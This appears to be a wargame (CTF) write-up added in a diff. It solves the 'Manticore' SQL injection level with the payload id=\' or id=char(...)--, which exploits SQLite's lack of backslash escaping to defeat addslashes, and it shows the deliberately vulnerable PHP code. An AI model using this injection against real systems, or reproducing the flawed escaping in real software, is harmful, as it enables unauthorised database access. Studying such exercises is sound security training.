@@ -1,0 +1,31 @@
+?id=\' or id=char(97,100,109,105,110)--
+
+----
+Relevant quote from the documentation:
+
+A string constant is formed by enclosing the string in single quotes ('). A
+single quote within the string can be encoded by putting two single quotes in
+a row - as in Pascal. C-style escapes using the backslash character are not
+supported because they are not standard SQL. BLOB literals are string literals
+containing hexadecimal data and preceded by a single "x" or "X" character. ...
+A literal value can also be the token "NULL".
+----
+
+So, SQLite will not escape single quote. However, admin will be searched by
+instead of admin, so we add a condition.
+
+query : select id from member where id=\' or id=char(97,100,109,105,110)--' and pw=''
+MANTICORE Clear!
+http://www.wechall.net
+<?php
+  include "./config.php";
+  login_chk();
+  $db = sqlite_open("./db/manticore.db");
+  $_GET['id'] = addslashes($_GET['id']);
+  $_GET['pw'] = addslashes($_GET['pw']);
+  $query = "select id from member where id='{$_GET[id]}' and pw='{$_GET[pw]}'";
+  echo "<hr>query : <strong>{$query}</strong><hr><br>";
+  $result = sqlite_fetch_array(sqlite_query($db,$query));
+  if($result['id'] == "admin") solve("manticore");
+  highlight_file(__FILE__);
+?>
